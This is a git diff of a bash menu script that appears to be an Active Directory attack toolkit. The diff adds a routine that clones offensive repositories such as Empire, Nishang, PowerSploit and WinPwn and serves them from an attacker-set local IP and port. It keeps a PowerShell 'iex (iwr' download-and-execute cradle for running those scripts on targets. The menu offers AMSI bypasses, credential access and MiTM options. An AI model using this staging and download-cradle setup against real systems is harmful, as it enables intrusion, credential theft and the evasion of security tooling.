@@ -1,8 +1,10 @@
 # Test
 
+
 ################################################################################
 # Variables                                                                    #
 ################################################################################
+
 
 LocalIP="10.10.14.10";		#
 LocalPort="8080";		#
@@ -27,9 +29,11 @@ MainCheck="1"			#
 UserList="'/usr/share/seclists/Usernames/Names/names.txt'"
 UserListXato="'/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'"
 
+
 ################################################################################
 # Colors                                                                       #
 ################################################################################
+
 
 RESTORE='\033[0m'
 
@@ -52,6 +56,12 @@ WHITE='\033[01;37m'
 IBLUE='\033[02;34m'
 ICYAN='\033[02;36m'
 
+
+################################################################################
+# Repo List                                                                    #
+################################################################################
+
+
 adPEASRepo="https://raw.githubusercontent.com/61106960/adPEAS/main/";
 BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
 DomainPasswordSprayRepo="https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/"
@@ -69,9 +79,227 @@ S3cur3Th1sSh1tCredsRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/
 SecListsRepo="https://github.com/danielmiessler/SecLists/";
 WinPwnRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
 
+
+LocalRepo="False"
+
+################################################################################
+# Local Repo	                                                               #
+################################################################################
+
+
+Function_LocalRepo () {
+
+mkdir -p $HOME/ADAT
+mkdir -p $HOME/ADAT/LocalRepo
+cd $HOME/ADAT
+
+# Set local repo locations in the ADAT folder.
+
+BloodHoundLocalRepo="$HOME/ADAT/BloodHound"
+EmpireLocalRepo="$HOME/ADAT/Empire"
+GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
+JAWSLocalRepo="$HOME/ADAT/JAWS"
+NishangLocalRepo="$HOME/ADAT/nishang"
+PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
+PowersploitLocalRepo="$HOME/ADAT/Powersploit"
+WinPwnLocalRepo="$HOME/ADAT/WinPwn"
+
+
+if [ -d "$EmpireLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "Empire is installed, checking if updated to latest version."
+    	cd $EmpireLocalRepo
+    	git pull "https://github.com/BC-SECURITY/Empire.git"
+    	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Empire Repo${RESTORE}"
+	git clone --recursive "https://github.com/BC-SECURITY/Empire.git" $HOME/ADAT/Empire
+	echo -e ""
+fi
+
+if [ -d "$NishangLocalRepo" ] 
+then
+    	echo -e ""
+    	echo -e "Nishang is installed, checking if updated to latest version."
+    	cd $NishangLocalRepo
+    	git pull "https://github.com/samratashok/nishang.git"
+    	echo -e "" 
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Nishang Repo${RESTORE}"
+	git clone --recursive "https://github.com/samratashok/nishang.git" $HOME/ADAT/nishang
+	echo -e ""
+fi
+
+
+
+if [ -d "$PowerSploitLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "PowerSploit is installed, checking if updated to latest version."
+    	cd $PowerSploitLocalRepo
+    	git pull "https://github.com/PowerShellMafia/PowerSploit.git"
+    	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning PowerSploit Repo${RESTORE}"
+	git clone --recursive "https://github.com/PowerShellMafia/PowerSploit.git" $HOME/ADAT/PowerSploit
+	echo -e ""
+fi
+
+
+if [ -d "$WinPwnLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "WinPwn is installed, checking if updated to latest version."
+    	cd $WinPwnLocalRepo
+    	git pull "https://github.com/S3cur3Th1sSh1t/WinPwn.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning WinPwn Repo${RESTORE}"
+	git clone --recursive "https://github.com/S3cur3Th1sSh1t/WinPwn.git" $HOME/ADAT/WinPwn
+	echo -e ""
+fi
+
+if [ -d "$JAWSLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "JAWS is installed, checking if updated to latest version."
+    	cd $JAWSLocalRepo
+    	git pull "https://github.com/411Hall/JAWS.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning JAWS Repo${RESTORE}"
+	git clone --recursive "https://github.com/411Hall/JAWS.git" $HOME/ADAT/JAWS
+	echo -e ""
+fi
+
+if [ -d "$GetSystemTechniquesLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "Get-System-Techniques is installed, checking if updated to latest version."
+    	cd $GetSystemTechniquesLocalRepo
+    	git pull "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Get-System-Techniques Repo${RESTORE}"
+	git clone --recursive "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git" $HOME/ADAT/Get-System-Techniques
+	echo -e ""
+fi
+
+if [ -d "$BloodHoundLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "BloodHound is installed, checking if updated to latest version."
+    	cd $BloodHoundLocalRepo
+    	git pull "https://github.com/BloodHoundAD/BloodHound.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning BloodHound Repo${RESTORE}"
+	git clone --recursive "https://github.com/BloodHoundAD/BloodHound.git" $HOME/ADAT/BloodHound
+	echo -e ""
+fi
+
+if [ -d "$PowersploitLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "Powersploit is installed, checking if updated to latest version."
+    	cd $PowersploitLocalRepo
+    	git pull "https://github.com/PowerShellMafia/PowerSploit.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Powersploit Repo${RESTORE}"
+	git clone --recursive "https://github.com/PowerShellMafia/PowerSploit.git" $HOME/ADAT/Powersploit
+	echo -e ""
+fi
+
+# Copy local repo contents to single folder
+
+cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Powersploit/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
+
+# Set script repo locations to local IP and Port
+
+
+EmpireRepo="http://$LocalIP:$LocalPort/"
+NishangRepo="http://$LocalIP:$LocalPort/"
+PentestFactoryRepo="http://$LocalIP:$LocalPort/"
+LazagneRepo="http://$LocalIP:$LocalPort/"
+PowerSploitRepo="http://$LocalIP:$LocalPort/"
+S3cur3Th1sSh1tRepo="http://$LocalIP:$LocalPort/"
+JAWSRepo="http://$LocalIP:$LocalPort/"
+GetSystemTechniquesRepo="http://$LocalIP:$LocalPort/"
+BloodHoundRepo="http://$LocalIP:$LocalPort/"
+PowersploitRepo="http://$LocalIP:$LocalPort/"
+LocalRepo="True"
+
+}
+
+Internal_Menu_Host_Local(){
+
+Function_LocalRepo
+
+	clear
+	
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Set Local Host Variables${RESTORE}"
+echo -e ""
+read -p "Enter Local IP address : " LocalIP
+echo -e ""
+echo -e ""
+read -p "Enter Local Port to use : " LocalPort
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "The following variables have been set:"
+
+echo -ne "
+
+LocalIP		:	$LocalIP
+LocalPort	:	$LocalPort
+
+"
+echo -ne "
+            Return to previous menu?
+                 	
+        Q) -> Previous Menu
+"
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+
+}
+
+################################################################################
+# Download Methods                                                             #
+################################################################################
+
 iwr="iex (iwr -usebasicparsing "
 DownloadMethod="$iwr"
 
+
+################################################################################
+# Main                                                                         #
+################################################################################
 
 
 Internal_Menu_Main(){
@@ -85,7 +313,7 @@ echo -ne " What would you like to do?
 
 
 	1)  ->  [ Alternate Authentication	]
-	2   ->	[ Certificate Services 		]
+	2)  ->	[ Certificate Services 		]
 	3)  ->  [ Credential Access		]
 	4)  ->  [ MiTM Attacks 			]
 	5)  ->  [ MSSQL 			]
@@ -94,6 +322,7 @@ echo -ne " What would you like to do?
         8)  ->  [ Recon 			]
         
         A)  ->	[ AMSI Bypasses			]
+        L)  -> 	[ Host scripts on local host	]
         
 "
         read a
@@ -107,6 +336,7 @@ echo -ne " What would you like to do?
 	        7) 	Internal_Menu_Privilege_Escalation ;;
 	        8) 	Internal_Menu_Recon ;;
 	        a|A)	Internal_Menu_AMSI_Bypasses ;;
+	        l|L)	Internal_Menu_Host_Local ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
